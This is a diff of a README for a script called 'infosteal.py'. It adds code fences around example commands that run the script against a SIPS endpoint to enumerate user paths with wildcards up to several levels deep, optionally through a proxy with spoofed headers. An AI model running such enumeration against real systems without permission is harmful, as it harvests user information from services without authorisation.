@@ -71,9 +71,9 @@ If --output file.txt is used, all responses are stored for later analysis.
 Example Commands
 
 1. Run with Default 3 Wildcard Depth:
-
+```bash
 python infosteal.py https://example.com/sips --wildcard-depth 3 --verbose
-
+```
 Sends requests to:
 
 https://example.com/sips/sipsys/users/*
@@ -83,23 +83,20 @@ https://example.com/sips/sipsys/users/*/*/*
 
 
 2. Run with 5 Wildcard Depth and Save Output:
-
+```bash
 python infosteal.py https://example.com/sips --wildcard-depth 5 --output results.txt
+```
 
 Sends requests up to depth 5 and saves all results in results.txt.
 
 
 
 3. Use a Proxy and Custom Headers:
-
+```
 python infosteal.py https://example.com/sips --proxy http://127.0.0.1:8080 --headers '{"User-Agent": "Mozilla/5.0"}' --wildcard-depth 4
+```
 
 
-
-
----
-
-Why This is More Dynamic and Robust
 
 ✅ Requests Information from Every Stage
 ✅ Automatically Iterates Through Depths
